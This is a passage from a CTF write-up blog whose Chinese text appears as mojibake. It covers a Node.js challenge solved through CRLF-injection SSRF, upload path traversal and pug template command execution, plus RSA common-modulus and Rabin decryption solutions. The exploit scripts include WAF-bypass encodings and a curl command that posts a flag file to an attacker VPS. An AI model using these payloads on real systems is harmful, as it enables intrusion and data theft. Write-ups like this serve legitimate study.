ï¼›</p><p>3ã€/file_uploadï¼šé™åˆ¶äº†åªèƒ½ç”±IPä¸º<code>127.0.0.1</code>è¿›è¡Œæ–‡ä»¶ä¸Šä¼ ï¼Œå¹¶ä¸”æˆ‘ä»¬å¯ä»¥é€šè¿‡æ§åˆ¶MIMEè¿›è¡Œç›®å½•ç©¿è¶Šï¼Œä»è€Œå°†æ–‡ä»¶ä¸Šä¼ åˆ°ä»»æ„ç›®å½•ï¼›</p><p>4ã€/coreï¼šé€šè¿‡<code>q</code>å‘å†…ç½‘çš„8081ç«¯å£ä¼ å‚ï¼Œç„¶åè·å–æ•°æ®å†è¿”å›å¤–ç½‘ï¼Œå¹¶ä¸”å¯¹urlè¿›è¡Œé»‘åå•çš„è¿‡æ»¤ï¼Œä½†æ˜¯è¿™é‡Œçš„é»‘åå•å¯ä»¥ç›´æ¥ç”¨å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡ã€‚</p></blockquote><p>ä½†æ˜¯<code>/core</code>è·¯ç”±ä¸‹ä¸èƒ½ç›´æ¥SSRFï¼Œè€Œæ˜¯éœ€è¦åˆ©ç”¨<code>Node js</code>çš„ç¼–ç å®‰å…¨é—®é¢˜ï¼ˆå‚è€ƒ<a href="https://xz.aliyun.com/t/2894">è¿™é‡Œ</a>ï¼‰ï¼Œå¯¹ç¼–ç ç²¾å¿ƒæ„é€ è¿›è¡Œ<code>CRLFæ³¨å…¥</code>ä»è€Œæ¥è¿›è¡ŒSSRFï¼Œé‚£ä¹ˆè§£é¢˜æ€è·¯å°±æ˜ç¡®äº†ï¼š</p><ul><li>1ã€åˆ©ç”¨CRLFæ³¨å…¥è¿›è¡ŒSSRF</li><li>2ã€åˆ©ç”¨SSRFä¼ªé€ æœ¬åœ°IPè¿›è¡Œæ–‡ä»¶ä¸Šä¼ </li><li>3ã€ä¸Šä¼ åŒ…å«å‘½ä»¤æ‰§è¡Œä»£ç çš„pugæ–‡ä»¶åˆ°<code>/template</code>ç›®å½•</li><li>4ã€åˆ©ç”¨<code>action</code>å‚æ•°åŒ…å«æ–‡ä»¶ï¼Œæ‰§è¡Œå‘½ä»¤</li></ul><h3 id="è§£é¢˜-7"><a href="#è§£é¢˜-7" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h3><p>å‚è€ƒä¸Šé¢æ–‡ç« å¯çŸ¥ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ ä¸º<code>\u010D\u010A</code>æ¥æ›¿æ¢æ¢è¡Œ<code>\r\nï¼ˆ%0D%0Aï¼‰</code>ï¼Œå…¶ä»–çš„ä¸€äº›ç‰¹æ®Šå­—ç¬¦ä¹Ÿå¦‚æ­¤æ„é€ ï¼Œå¦‚<code>ç©ºæ ¼(%20)</code>æ„é€ ç¼–ç ä¸º<code>\u0120</code>ï¼Œ<code>+(%2B)</code>æ„é€ ç¼–ç æ„é€ ä¸º<code>\u012B</code>â€¦</p><p>æ ¹æ®è¿™ä¸ªæ–¹å¼ï¼Œæ„é€ æ‹†åˆ†è¯·æ±‚ä»è€Œè¿›è¡ŒSSRFï¼Œå‚è€ƒç½‘ä¸Šå¸ˆå‚…çš„expï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">payload = <span class="string">""" HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Connection: keep-alive</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">POST /file_upload HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Content-Length: &#123;&#125;</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=----WebKitFormBoundarysAs7bV3fMHq0JXUt</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;&#125;"""</span>.replace(<span class="string">'\n'</span>, <span class="string">'\r\n'</span>)</span><br><span class="line"></span><br><span class="line">body = <span class="string">"""------WebKitFormBoundarysAs7bV3fMHq0JXUt</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="file"; filename="ggb0n.pug"</span></span><br><span class="line"><span class="string">Content-Type: ../template</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-var x = eval("glob"+"al.proce"+"ss.mainMo"+"dule.re"+"quire('child_'+'pro'+'cess')['ex'+'ecSync']('cat /flag.txt').toString()")</span></span><br><span class="line"><span class="string">-return x</span></span><br><span class="line"><span class="string">------WebKitFormBoundarysAs7bV3fMHq0JXUt--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span>.replace(<span class="string">'\n'</span>, <span class="string">'\r\n'</span>)</span><br><span class="line"></span><br><span class="line">payload = payload.format(len(body), body) \</span><br><span class="line">    .replace(<span class="string">'+'</span>, <span class="string">'\u012b'</span>)             \</span><br><span class="line">    .replace(<span class="string">' '</span>, <span class="string">'\u0120'</span>)             \</span><br><span class="line">    .replace(<span class="string">'\r\n'</span>, <span class="string">'\u010d\u010a'</span>)    \</span><br><span class="line">    .replace(<span class="string">'"'</span>, <span class="string">'\u0122'</span>)             \</span><br><span class="line">    .replace(<span class="string">"'"</span>, <span class="string">'\u0a27'</span>)             \</span><br><span class="line">    .replace(<span class="string">'['</span>, <span class="string">'\u015b'</span>)             \</span><br><span class="line">    .replace(<span class="string">']'</span>, <span class="string">'\u015d'</span>) \</span><br><span class="line">    + <span class="string">'GET'</span> + <span class="string">'\u0120'</span> + <span class="string">'/'</span></span><br><span class="line"></span><br><span class="line">requests.get(</span><br><span class="line">    <span class="string">'http://5a1643b9-eac5-48ba-92b3-36516bcde120.node3.buuoj.cn/core?q='</span> + payload)</span><br><span class="line"></span><br><span class="line">print(requests.get(</span><br><span class="line">    <span class="string">'http://5a1643b9-eac5-48ba-92b3-36516bcde120.node3.buuoj.cn/?action=ggb0n'</span>).text)</span><br></pre></td></tr></table></figure><p>å‡ºé¢˜å¸ˆå‚…çš„expå…·æœ‰æ›´é«˜çš„çµæ´»æ€§ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">payloadRaw = <span class="string">"""x HTTP/1.1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">POST /file_upload HTTP/1.1</span></span><br><span class="line"><span class="string">Host: localhost:8081</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=---------------------------12837266501973088788260782942</span></span><br><span class="line"><span class="string">Content-Length: 6279</span></span><br><span class="line"><span class="string">Origin: http://localhost:8081</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Referer: http://localhost:8081/?action=upload</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-----------------------------12837266501973088788260782942</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="file"; filename="5am3_get_flag.pug"</span></span><br><span class="line"><span class="string">Content-Type: ../template</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">- global.process.mainModule.require('child_process').execSync('evalcmd')</span></span><br><span class="line"><span class="string">-----------------------------12837266501973088788260782942--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getParm</span><span class="params">(payload)</span>:</span></span><br><span class="line">    payload = payload.replace(<span class="string">" "</span>,<span class="string">"%C4%A0"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"\n"</span>,<span class="string">"%C4%8D%C4%8A"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"\""</span>,<span class="string">"%C4%A2"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"'"</span>,<span class="string">"%C4%A7"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"`"</span>,<span class="string">"%C5%A0"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"!"</span>,<span class="string">"%C4%A1"</span>)</span><br><span class="line"></span><br><span class="line">    payload = payload.replace(<span class="string">"+"</span>,<span class="string">"%2B"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">";"</span>,<span class="string">"%3B"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"&amp;"</span>,<span class="string">"%26"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Bypass Waf </span></span><br><span class="line">    payload = payload.replace(<span class="string">"global"</span>,<span class="string">"%C5%A7%C5%AC%C5%AF%C5%A2%C5%A1%C5%AC"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"process"</span>,<span class="string">"%C5%B0%C5%B2%C5%AF%C5%A3%C5%A5%C5%B3%C5%B3"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"mainModule"</span>,<span class="string">"%C5%AD%C5%A1%C5%A9%C5%AE%C5%8D%C5%AF%C5%A4%C5%B5%C5%AC%C5%A5"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"require"</span>,<span class="string">"%C5%B2%C5%A5%C5%B1%C5%B5%C5%A9%C5%B2%C5%A5"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"root"</span>,<span class="string">"%C5%B2%C5%AF%C5%AF%C5%B4"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"child_process"</span>,<span class="string">"%C5%A3%C5%A8%C5%A9%C5%AC%C5%A4%C5%9F%C5%B0%C5%B2%C5%AF%C5%A3%C5%A5%C5%B3%C5%B3"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"exec"</span>,<span class="string">"%C5%A5%C5%B8%C5%A5%C5%A3"</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(url,cmd)</span>:</span></span><br><span class="line">    payloadC =  payloadRaw.replace(<span class="string">"evalcmd"</span>,cmd)</span><br><span class="line">    urlC = url+<span class="string">"/core?q="</span>+getParm(payloadC)</span><br><span class="line">    requests.get(urlC)</span><br><span class="line">    </span><br><span class="line">    requests.get(url+<span class="string">"/?action=5am3_get_flag"</span>).text</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    targetUrl = sys.argv[<span class="number">1</span>]</span><br><span class="line">    cmd = sys.argv[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">print</span> run(targetUrl,cmd)</span><br><span class="line"></span><br><span class="line"><span class="comment"># python exp.py http://127.0.0.1:8081 "curl vps-ip:port -X POST -d `cat /flag.txt`"</span></span><br></pre></td></tr></table></figure><p>åŒå¿—ä»éœ€åŠªåŠ›å•Šï¼</p><p>å‚è€ƒï¼š<br><a href="https://blog.csdn.net/qq_42181428/article/details/104474414?fps=1&amp;locationNum=2">https://blog.csdn.net/qq_42181428/article/details/104474414?fps=1&amp;locationNum=2</a><br><a href="https://blog.5am3.com/2020/02/11/ctf-node1/#è‡ªå·±å‡ºçš„-node-game">https://blog.5am3.com/2020/02/11/ctf-node1/#%E8%87%AA%E5%B7%B1%E5%87%BA%E7%9A%84-node-game</a></p><h2 id="Crypto-Easy-RSA"><a href="#Crypto-Easy-RSA" class="headerlink" title="Crypto-Easy_RSA"></a>Crypto-Easy_RSA</h2><p>è€ƒå¯Ÿå…±æ¨¡æ”»å‡»</p><h3 id="è§£é¢˜-8"><a href="#è§£é¢˜-8" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h3><p>ç»™çš„é™„ä»¶å†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">27560959918385616419486273009594513460044316476337842585463553105701869531698366304637678008602799005181601310816935394003041930445509801196554897781529962616349442136039951911764620999116915741924245788988332766182305635804754798018489793066811741026902011980807157882639313892932653620491354630354060462594865874663773934670618930504925812833202047183166423043264815905853486053255310346030416687430724204177468176762512566055165798172418622268751968793997676391170773216291607752885987933866163158257336522567086228092863302685493888839866559622429685925525799985062044536032584132602747754107800116960090941957657</span></span><br><span class="line">e1 = <span class="number">464857</span></span><br><span class="line">e2 = <span class="number">190529</span></span><br><span class="line">c1 = <span class="number">21823306870841016169952481786862436752894840403702198056283357605213928505593301063582851595978932538906067287633295577036042158302374948726749348518563038266373826871950904733691046595387955703305846728530987885075910490362453202598654326947224392718573893241175123285569008519568745153449344966513636585290770127055273442962689462195231016899149101764299663284434805817339348868793709084130862028614587704503862805479792184019334567648078767418576316170976110991128933886639402771294997811025942544455255589081280244545901394681866421223066422484654301298662143648389546410087950190562132305368935595374543145047531</span></span><br><span class="line">c2 = <span class="number">9206260935066257829121388953665257330462733292786644374322218835580114859866206824679553444406457919107749074087554277542345820215439646770680403669560474462369400641865810922332023620699210211474208020801386285068698280364369889940167999918586298280468301097349599560130461998493342138792264005228209537462674085410740693861782834212336781821810115004115324470013999092462310414257990310781534056807393206155460371454836230410545171068506044174001172922614805135260670524852139187370335492876094059860576794839704978988507147972109411033377749446821374195721696073748745825273557964015532261000826958288349348269664</span></span><br></pre></td></tr></table></figure><p>è¿™å°±å¾ˆæ˜æ˜¾äº†ï¼Œå¯¹ç›¸åŒçš„æ˜æ–‡ï¼Œåˆ©ç”¨ç›¸åŒçš„æ¨¡æ•°<code>n</code>ï¼Œä¸åŒçš„<code>e</code>è¿›è¡ŒåŠ å¯†ï¼Œæ˜¾ç„¶çš„å…±æ¨¡æ”»å‡»ã€‚<br>ç›´æ¥ä¸Šè„šæœ¬äº†ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">sys.setrecursionlimit(<span class="number">1000000</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">      <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      g, y, x = egcd(b % a, a)ä¸ªå­—ç¬¦</span><br><span class="line">      <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span><span class="params">(a, m)</span>:</span></span><br><span class="line">    g, x, y = egcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">      <span class="keyword">raise</span> Exception(<span class="string">'modular inverse does not exist'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      <span class="keyword">return</span> x % m</span><br><span class="line"></span><br><span class="line">n = <span class="number">27560959918385616419486273009594513460044316476337842585463553105701869531698366304637678008602799005181601310816935394003041930445509801196554897781529962616349442136039951911764620999116915741924245788988332766182305635804754798018489793066811741026902011980807157882639313892932653620491354630354060462594865874663773934670618930504925812833202047183166423043264815905853486053255310346030416687430724204177468176762512566055165798172418622268751968793997676391170773216291607752885987933866163158257336522567086228092863302685493888839866559622429685925525799985062044536032584132602747754107800116960090941957657</span></span><br><span class="line">e1 = <span class="number">464857</span></span><br><span class="line">e2 = <span class="number">190529</span></span><br><span class="line">c1 = <span class="number">21823306870841016169952481786862436752894840403702198056283357605213928505593301063582851595978932538906067287633295577036042158302374948726749348518563038266373826871950904733691046595387955703305846728530987885075910490362453202598654326947224392718573893241175123285569008519568745153449344966513636585290770127055273442962689462195231016899149101764299663284434805817339348868793709084130862028614587704503862805479792184019334567648078767418576316170976110991128933886639402771294997811025942544455255589081280244545901394681866421223066422484654301298662143648389546410087950190562132305368935595374543145047531</span></span><br><span class="line">c2 = <span class="number">9206260935066257829121388953665257330462733292786644374322218835580114859866206824679553444406457919107749074087554277542345820215439646770680403669560474462369400641865810922332023620699210211474208020801386285068698280364369889940167999918586298280468301097349599560130461998493342138792264005228209537462674085410740693861782834212336781821810115004115324470013999092462310414257990310781534056807393206155460371454836230410545171068506044174001172922614805135260670524852139187370335492876094059860576794839704978988507147972109411033377749446821374195721696073748745825273557964015532261000826958288349348269664</span></span><br><span class="line"></span><br><span class="line">s = egcd(e1, e2)</span><br><span class="line">s1 = s[<span class="number">1</span>]</span><br><span class="line">s2 = s[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s1&lt;<span class="number">0</span>:</span><br><span class="line">   s1 = - s1</span><br><span class="line">   c1 = modinv(c1, n)</span><br><span class="line"><span class="keyword">elif</span> s2&lt;<span class="number">0</span>:</span><br><span class="line">   s2 = - s2</span><br><span class="line">   c2 = modinv(c2, n)</span><br><span class="line">m=(pow(c1,s1,n)*pow(c2,s2,n)) % n</span><br><span class="line"><span class="keyword">print</span> (binascii.unhexlify(hex(m)[<span class="number">2</span>:].strip(<span class="string">"L"</span>)))</span><br></pre></td></tr></table></figure><p>å…³äºRSAæ”»å‡»çš„ä¸€äº›å¸¸è§é¢˜ç›®ï¼Œå¯ä»¥å‚è€ƒ<a href="https://xz.aliyun.com/t/6459">è¿™é‡Œ</a>ã€‚</p><h2 id="Crypto-warm-up"><a href="#Crypto-warm-up" class="headerlink" title="Crypto-warm_up"></a>Crypto-warm_up</h2><p>ä¸€é“RSAæ”»å‡»é¢˜ï¼Œæ¯”èµ›çš„æ—¶å€™ç”¨äº†å¾ˆä¹…çš„æ—¶é—´ï¼Œç»“æœæ–¹æ³•æ˜¯é‚£ä¸ªæ–¹æ³•ï¼Œä¹Ÿæ²¡æ¯›ç—…ï¼Œä½†æ˜¯æ‹¿åˆ°çš„ä¸­é—´è§£å¯†ç»“æœå°±æ˜¯è·Ÿæ­£ç¡®çš„ä¸ä¸€æ ·â€¦<br>ã€è¡¥å……ã€‘åæ¥å¾—çŸ¥æ˜¯åˆ©ç”¨<a href="https://blog.csdn.net/jcbx_/article/details/101066670">Rabinç®—æ³•</a>æ¥è§£å¯†ï¼Œ</p><h3 id="é¢˜ç›®åˆ†æ-7"><a href="#é¢˜ç›®åˆ†æ-7" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>é¦–å…ˆæ‹¿åˆ°åŠ å¯†çš„è„šæœ¬ï¼š<br><code>challenge</code>ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> encode <span class="keyword">import</span> KEY</span><br><span class="line"></span><br><span class="line">q=getPrime(<span class="number">1024</span>)</span><br><span class="line">p=getPrime(<span class="number">1024</span>)</span><br><span class="line">r=getPrime(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">s=getPrime(<span class="number">1500</span>)</span><br><span class="line"></span><br><span class="line">e1=<span class="number">125794</span></span><br><span class="line">e2=<span class="number">42373</span></span><br><span class="line"></span><br><span class="line">n1=p*q</span><br><span class="line"><span class="comment"># p=131007115323263999345439921359227318254405259922548848874604821887442317315261280241204120172695148419556904875799765832598963733615261986846902786588239855657188269808050049322273049247577603319550134241252668567291670945189847048114844786099701880760746513002722191178146535455786553456997962473256126933599</span></span><br><span class="line"><span class="comment"># q=119483326784566375381311671166934261653966910443478433390480121272123328703673727110548386173243715369452830115984647613984491314122410531350348274710343333683717539768667655774410095306308786327548868489032433387156558717074449072976228756713826882644799579064381868958833899404263434981929880125095896045279</span></span><br><span class="line">n2=p*r</span><br><span class="line"><span class="comment"># r=125865800078882436358190150840086704132269782327092865891978833903435318406585569079365400123511664535093591726335541806103608520149741821723730509181335231384826827110615769921634583280405181533715780121294953290009221367811719652713563785099152724624248766800252106719691710099748709715428046927462566738829</span></span><br><span class="line">n3=p*q*s</span><br><span class="line"><span class="comment"># s=4381527556155456244163866461213062154975584084098516713465580696307104582336232806581070200178877144056318286852510416984171734722261473011812834553119204840984224160234243628578437239474676744592256886496775536777147355925487433224470975028941234194214177866322189418677266623335736030464485482684975053531544588046871751319647627210975030993527752551643707233557167595205555007238628961572027648064667065121254775370786901687256744800890945396435909316593963191272036460122138655751400930994411285603646950022989642830534704209469689551712512249174150742858665648252625354876868232433296490519493372739129388386546</span></span><br><span class="line">c1=pow(s,e1,n1)</span><br><span class="line">Key=int(KEY.encode(<span class="string">'hex'</span>),<span class="number">16</span>)</span><br><span class="line">key_encode=pow(Key,e2,n3)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"enc"</span>,<span class="string">"a"</span>)<span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">"c1: "</span>+str(c1)+<span class="string">"\n"</span>)</span><br><span class="line">    f.write(<span class="string">"n1: "</span>+str(n1)+<span class="string">"\n"</span>)</span><br><span class="line">    f.write(<span class="string">"n2: "</span>+str(n2)+<span class="string">"\n"</span>)</span><br><span class="line">    f.write(<span class="string">"key_encode: "</span>+str(key_encode)+<span class="string">"\n"</span>)</span><br></pre></td></tr></table></figure><p><code>encode</code>ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">KEY = os.urandom(len(flag))</span><br><span class="line"></span><br><span class="line">dec=int(flag.encode(<span class="string">'hex'</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> len(bin(dec)[<span class="number">2</span>:])==<span class="number">335</span></span><br><span class="line">mask=int(<span class="string">'1'</span>*<span class="number">335</span>,<span class="number">2</span>)</span><br><span class="line">dec=(dec^dec&lt;&lt;<span class="number">200</span> )&amp;mask</span><br><span class="line">enc=dec^bytes_to_long(KEY)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"enc: "</span>+str(enc)</span><br><span class="line"></span><br><span class="line"><span class="comment">#enc: 17403902166198774030870481073653666694643312949888760770888896025597904503707411677223946079009696809</span></span><br></pre></td></tr></table></figure><p>å®¡è®¡ä»£ç å¯çŸ¥ï¼Œè¦æ‹¿åˆ°flagï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦æ‹¿åˆ°<code>KEY</code>ï¼Œè€Œ<code>KEY</code>æ˜¯ç»è¿‡RSAåŠ å¯†çš„ã€‚<br>ä½†æ˜¯è§‚å¯ŸRSAä»£ç å‘ç°<code>n1</code>å’Œ<code>n2</code>æœ‰å…¬çº¦æ•°<code>p</code>ï¼Œåˆ©ç”¨æ¬§å‡ é‡Œä½•ç®—æ³•å³å¯æ±‚å¾—ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(m,n)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> n==<span class="number">0</span>:         <span class="comment">#è€ƒè™‘ç‰¹æ®Šæƒ…å†µ</span></span><br><span class="line">        print(<span class="string">"n is not equal 0!"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">while</span> m%n!=<span class="number">0</span>:</span><br><span class="line">            new=m</span><br><span class="line">            m=n</span><br><span class="line">            n=new%n</span><br><span class="line">        <span class="keyword">return</span> n</span><br></pre></td></tr></table></figure><p>è¿™æ ·æˆ‘ä»¬å°±æœ‰äº†<code>p</code>ã€<code>q</code>ã€<code>r</code>ï¼Œä½†æ˜¯è¦å¾—åˆ°<code>KEY</code>ï¼Œæˆ‘ä»¬éœ€è¦æ‹¿åˆ°<code>s</code>ï¼Œè¿™ä¸ªåœ°æ–¹å‚è€ƒäº†ç½‘ä¸Šçš„<a href="https://www.anquanke.com/post/id/164575#h2-4">ä¸€ç¯‡æ–‡ç« </a>ä¸­çš„ä¸€éƒ¨åˆ†æ¥æ±‚ï¼Œä½†æ˜¯æ±‚å¾—çš„<code>s</code>ä¸æ˜¯<code>1500</code>bitã€ä½†æ˜¯åŠ å¯†çš„å¯†æ–‡å´æ˜¯ä¸€æ ·çš„â€¦ç„¶åä¹Ÿå°±æ²¡æœ‰åšä¸‹å»äº†ï¼Œç­‰WPå§â€¦<br>åæ¥ä¸€ä½å¸ˆå‚…åˆ†äº«äº†è‡ªå·±çš„æ€»ç»“ï¼Œå­¦ä¹ ä¸‹å§ï¼š<br><a href="http://www.soreatu.com/ctf/writeups/Writeup%20for%20Crypto%20problems%20in%20NCTF%202019.html#easyrsa">http://www.soreatu.com/ctf/writeups/Writeup%20for%20Crypto%20problems%20in%20NCTF%202019.html#easyrsa</a><br>å¸ˆå‚…ç»™äº†ä»–çš„è„šæœ¬åšå‚è€ƒï¼Œä½†æ˜¯è¿˜æ²¡å®Œå…¨ææ˜ç™½ï¼Œç­‰WPå‡ºæ¥ç ”ç©¶å¥½äº†å†è¡¥å……ã€‚</p><h3 id="è¡¥å……"><a href="#è¡¥å……" class="headerlink" title="è¡¥å……"></a>è¡¥å……</h3><p>åˆ©ç”¨<code>Rabin</code>ç®—æ³•è§£å¯†RSAéƒ¨åˆ†ï¼Œç„¶ååˆ©ç”¨è¿ç®—çš„ç‰¹æ€§å°†<code>dec=(dec^dec&lt;&lt;200)&amp;mask</code>é€šè¿‡<code>dec=(dec^dec&gt;&gt;200)&amp;mask</code>è¿›è¡Œè¿˜åŸï¼Œè§£å¯†è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">c1 = <span class="number">9977992111543474765993146699435780943354123551515555639473990571150196059887059696672744669228084544909025528146255490100789992216506586730653100894938711107779449187833366325936098812758615334617812732956967746820046321447169099942918022803930068529359616171025439714650868454930763815035475473077689115645913895433110149735235210437428625515317444853803605457325117693750834579622201070329710209543724812590086065816764917135636424809464755834786301901125786342127636605411141721732886212695150911960225370999521213349980949049923324623683647865441245309856444824402766736069791224029707519660787841893575575974855</span></span><br><span class="line">n1 = <span class="number">15653165971272925436189715950306169488648677427569197436559321968692908786349053303839431043588260338317859397537409728729274630550454731306685369845739785958309492188309739135163206662322980634812713910231189563194520522299672424106135656125893413504868167774287157038801622413798125676071689173117885182987841510070517898710350608725809906704505037866925358298525340393278376093071591988997064894579887906638790394371193617375086245950012269822349986482584060745112453163774290976851732665573217485779016736517696391513031881133151033844438314444107440811148603369668944891577028184130587885396017194863581130429121</span></span><br><span class="line">n2 = <span class="number">16489315386189042325770722192051506427349661112741403036117573859132337429264884611622357211389605225298644036805277212706583007338311350354908188224017869204022357980160833603890106564921333757491827877881996534008550579568290954848163873756688735179943313218316121156169277347705100580489857710376956784845139492131491003087888548241338393764269176675849400130460962312511303071508724811323438930655022930044289801178261135747942804968069730574751117952892336466612936801767553879313788406195290612707141092629226262881229776085126595220954398177476898915921943956162959257866832266411559621885794764791161258015571</span></span><br><span class="line">key_encode = <span class="number">154190230043753146353030548481259824097315973300626635557077557377724792985967471051038771303021991128148382608945680808938022458604078361850131745923161785422897171143162106718751785423910619082539632583776061636384945874434750267946631953612827762111005810457361526448525422842867001928519321359911975591581818207635923763710541026422076426423704596685256919683190492684987278018502571910294876596243956361277398629634060304624160081587277143907713428490243383194813480543419579737033035126867092469545345710049931834620804229860730306833456574575819681754486527026055566414873480425894862255077897522535758341968447477137256183708467693039633376832871571997148048935811129126086180156680457571784113049835290351001647282189000382279868628184984112626304731043149626327230591704892805774286122197299007823500636066926273430033695532664238665904030038927362086521253828046061437563787421700166850374578569457126653311652359735584860062417872495590142553341805723610473288209629102401412355687033859617593346080141954959333922596227692493410939482451187988507415231993</span></span><br><span class="line">p = gmpy2.gcd(n1, n2)</span><br><span class="line">q = n1/p</span><br><span class="line">e1 = <span class="number">125794</span></span><br><span class="line">e2 = <span class="number">42373</span></span><br><span class="line">b = gmpy2.gcd(e1, (p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">bd = gmpy2.invert(e1/b, (p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">s = pow(c1, bd, n1)</span><br><span class="line"></span><br><span class="line">u = pow(s,(p+<span class="number">1</span>)/<span class="number">4</span>,p)</span><br><span class="line">v = pow(s,(q+<span class="number">1</span>)/<span class="number">4</span>,q)</span><br><span class="line">s = gmpy2.invert(p,q)</span><br><span class="line">t = gmpy2.invert(q,p)</span><br><span class="line">x = (t*q*u+s*p*v)%n1</span><br><span class="line">x2 = -x%n1</span><br><span class="line">y = (t*q*u-s*p*v)%n1</span><br><span class="line">y2 = -y%n1</span><br><span class="line">might_s = [x, x2, y, y2]</span><br><span class="line">might_d = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> might_s:</span><br><span class="line">    might_d.append(int(gmpy2.invert(e2, (p<span class="number">-1</span>)*(q<span class="number">-1</span>)*(i<span class="number">-1</span>))))</span><br><span class="line"></span><br><span class="line">might_key = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">    might_key.append(pow(key_encode, might_d[i], 